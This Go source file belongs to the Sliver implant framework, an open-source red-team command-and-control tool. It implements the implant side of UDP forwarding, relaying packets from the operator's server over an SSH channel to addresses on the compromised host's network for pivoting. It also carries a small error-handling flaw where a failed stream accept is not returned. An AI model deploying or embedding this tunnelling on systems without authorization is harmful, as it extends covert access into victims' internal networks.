package comm

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"encoding/gob"
	"fmt"
	"io"
	"net"
	"os"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"

	"github.com/bishopfox/sliver/protobuf/commpb"
)

// DialUDP - The server is forwarding us some UDP packets, writes them on the
// address:port socket, and read the response until some timeout.
// NOTE: All packets coming from the stream have the same destination addess:port
// so we only have one equivalent UDP connections to write the packets to.
func DialUDP(info *commpb.Conn, ch ssh.NewChannel) error {

	// Create the UDP handler: dials the destination UDP address.
	handler, err := newDialerUDP(info)
	if err != nil {
		return err
	}

	// Accept stream and pipe
	stream, reqs, err := ch.Accept()
	if err != nil {
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("failed to accept stream (ID %s): %s", info.ID, err.Error())
			// {{end}}
		}
	}
	go ssh.DiscardRequests(reqs)

	// Create the UDP stream to wire the ReadWriteCloser and the UDP handler
	handler.stream = &udpStream{
		r: gob.NewDecoder(stream),
		w: gob.NewEncoder(stream),
		c: stream,
	}

	// Only then we write the data coming from the server,
	// as we're ready to get the response.
	go handler.handleWrite()

	return nil
}

// udpDialer - An objet that dials a single UDP address and writes all its routed
// traffic to it, no matter the src address of the packets. Therefore, this handler
// is hardly ever used alone, except when we want to target specific addresses for
// a specific connection, like routing a QUIC-transported implant.
//
// This handler should therefore not be used alone for pure UDP port forwarding.
type udpDialer struct {
	hostPort string
	stream   *udpStream
	outbound *udpConns
}

// newDialerUDP - Creates UDP handler that is connected to an addess:port on the
// implant's host network. If specified, we dial with given source host:ports as well.
func newDialerUDP(info *commpb.Conn) (h *udpDialer, err error) {

	// Handler with a working conn, and wired up to the Comms.
	h = &udpDialer{
		hostPort: fmt.Sprintf("%s:%d", info.RHost, info.RPort),
		outbound: &udpConns{
			m: map[string]*udpConn{},
		},
	}

	return
}

// handleWrite - Reads all packets forwarded by the server and write them to the UDP conn.
func (h *udpDialer) handleWrite() error {
	for {
		// Decode a UDP packet
		packet := &udpPacket{}
		if err := h.stream.r.Decode(&packet); err != nil {
			return err
		}

		// Dial the address or get the current UDP connection to it
		conn, exists, err := h.outbound.dial(packet.Src, h.hostPort)
		if err != nil {
			return err
		}
		const maxConns = 100
		if !exists {
			if h.outbound.len() <= maxConns {
				go h.handleRead(packet, conn)
			} else {
				// {{if .Config.Debug}}
				log.Printf("exceeded max udp connections (%d)", maxConns)
				// {{end}}
			}
		}
		_, err = conn.Write(packet.Payload)
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("Done writing to UDP %s", h.hostPort)
			// {{end}}
			return err
		}
	}
}

// handleRead - Read all UDP packets coming at the host address:port
// and route (encode) them back to the server.
func (h *udpDialer) handleRead(p *udpPacket, conn *udpConn) error {
	const maxMTU = 9012
	buff := make([]byte, maxMTU)
	for {
		//response must arrive within 15 seconds
		deadline := 15 * time.Second
		conn.SetReadDeadline(time.Now().Add(deadline))

		//read response
		n, err := conn.Read(buff) // n, err := h.outbound.Read(buff)
		if err != nil {
			if !os.IsTimeout(err) && err != io.EOF {
				// {{if .Config.Debug}}
				log.Printf("read error: %s", err)
				// {{end}}
			}
			break
		}
		b := buff[:n]

		//encode back over ssh connection
		err = h.stream.encode(p.Src, b)
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("encode error: %s", err)
			// {{end}}
			return err
		}
	}
	return nil
}

type udpConns struct {
	sync.Mutex
	m map[string]*udpConn
}

func (cs *udpConns) dial(id, addr string) (*udpConn, bool, error) {
	cs.Lock()
	defer cs.Unlock()
	conn, ok := cs.m[id]
	if !ok {
		c, err := net.Dial("udp", addr)
		if err != nil {
			return nil, false, err
		}
		conn = &udpConn{
			id:   id,
			Conn: c,
		}
		cs.m[id] = conn
	}
	return conn, ok, nil
}

func (cs *udpConns) len() int {
	cs.Lock()
	l := len(cs.m)
	cs.Unlock()
	return l
}

func (cs *udpConns) remove(id string) {
	cs.Lock()
	delete(cs.m, id)
	cs.Unlock()
}

func (cs *udpConns) closeAll() {
	cs.Lock()
	for id, conn := range cs.m {
		conn.Close()
		delete(cs.m, id)
	}
	cs.Unlock()
}

type udpConn struct {
	id string
	net.Conn
}
